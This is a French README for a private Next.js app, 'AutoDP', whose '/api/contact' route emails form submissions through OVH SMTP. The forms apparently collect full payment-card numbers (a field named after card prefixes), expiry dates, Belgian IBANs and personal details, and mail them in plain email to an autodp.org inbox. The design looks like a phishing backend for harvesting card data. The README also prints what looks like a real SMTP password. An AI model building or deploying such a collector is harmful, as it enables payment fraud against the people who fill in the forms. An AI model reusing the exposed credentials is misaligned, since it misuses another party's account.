# AutoDP - API de Contact Next.js

Application Next.js avec API route pour l'envoi d'emails via SMTP OVH.

## 🚀 Fonctionnalités

- **API Route** `/api/contact` pour l'envoi d'emails
- **Deux formulaires** : Enregistrement et Réception de fond
- **SMTP OVH** configuré avec SSL/TLS
- **Templates HTML** automatiques
- **Validation** des données côté serveur
- **Responsive design** avec Tailwind CSS

## 📋 Prérequis

- Node.js 18+
- Compte Vercel
- Domaine `autodp.org`
- Serveur email OVH

## 🛠️ Installation

1. **Cloner le projet** :
   ```bash
   git clone <repository-url>
   cd auto-dp
   ```

2. **Installer les dépendances** :
   ```bash
   npm install
   ```

3. **Configurer les variables d'environnement** :
   ```bash
   cp env.example .env.local
   # Éditer .env.local avec vos paramètres SMTP
   ```

4. **Démarrer en développement** :
   ```bash
   npm run dev
   ```

## 🔧 Configuration

### Variables d'environnement

Créer un fichier `.env.local` :

```env
# Configuration SMTP OVH
EMAIL_USER=registratie@autodp.org
EMAIL_PASS=S.registratie2025
EMAIL_HOST=ssl0.ovh.net
EMAIL_PORT=465

# Email de réception
RECIPIENT_EMAIL=registratie@autodp.org
```

### API Endpoints

#### POST `/api/contact`

Envoie un email avec les données du formulaire.

**Paramètres de requête** :
- `type` : `enregistrement` ou `reception`

**Body** (JSON) :
```json
{
  "nom_complet": "string",
  "email": "string",
  "telephone": "string",
  "adresse": "string",
  "carte_be": "string",
  "carte_52_49_51": "string",
  "date_expiration": "string",
  "submission_id": "string",
  "montant": "number"
}
```

**Réponse** :
```json
{
  "success": true,
  "message": "Email envoyé avec succès",
  "messageId": "message-id"
}
```

## 🎨 Composants

### Contact.tsx
Formulaire d'enregistrement avec validation et envoi d'email.

### FundReception.tsx
Formulaire de réception de fond avec validation et envoi d'email.

## 📧 Templates d'Email

Les emails sont générés automatiquement avec :
- Design HTML responsive
- Informations formatées du formulaire
- Différenciation par type de formulaire
- Horodatage automatique

## 🚀 Déploiement

Voir [DEPLOYMENT.md](./DEPLOYMENT.md) pour les instructions complètes de déploiement sur Vercel.

### Déploiement rapide

1. **Connecter à Vercel** :
   ```bash
   vercel login
   vercel
   ```

2. **Configurer les variables d'environnement** dans le dashboard Vercel

3. **Configurer le domaine** `autodp.org`

## 🧪 Test

### Test local
```bash
npm run dev
# Ouvrir http://localhost:3000
```

### Test API
```bash
curl -X POST http://localhost:3000/api/contact?type=enregistrement \
  -H "Content-Type: application/json" \
  -d '{
    "nom_complet": "Test User",
    "email": "test@example.com",
    "telephone": "0123456789",
    "adresse": "123 Test Street",
    "carte_be": "BE76 1234 5678 9012",
    "carte_52_49_51": "1234 5678 9012 3456",
    "date_expiration": "12/25",
    "submission_id": "TEST123",
    "montant": "100.00"
  }'
```

## 📁 Structure du projet

```
├── app/
│   ├── api/
│   │   └── contact/
│   │       └── route.ts          # API route
│   ├── components/
│   │   ├── Contact.tsx           # Formulaire d'enregistrement
│   │   └── FundReception.tsx     # Formulaire de réception
│   ├── globals.css               # Styles globaux
│   ├── layout.tsx                # Layout principal
│   └── page.tsx                  # Page d'accueil
├── public/                       # Assets statiques
├── .env.local                    # Variables d'environnement
├── next.config.js                # Configuration Next.js
├── tailwind.config.js            # Configuration Tailwind
├── tsconfig.json                 # Configuration TypeScript
└── vercel.json                   # Configuration Vercel
```

## 🔒 Sécurité

- Validation des données côté serveur
- Variables d'environnement sécurisées
- Protection contre les injections
- Rate limiting Vercel

## 📞 Support

Pour toute question ou problème :
1. Vérifier les logs Vercel
2. Tester la connexion SMTP
3. Vérifier les variables d'environnement
4. Consulter la documentation Vercel

## 📄 Licence

Projet privé - AutoDP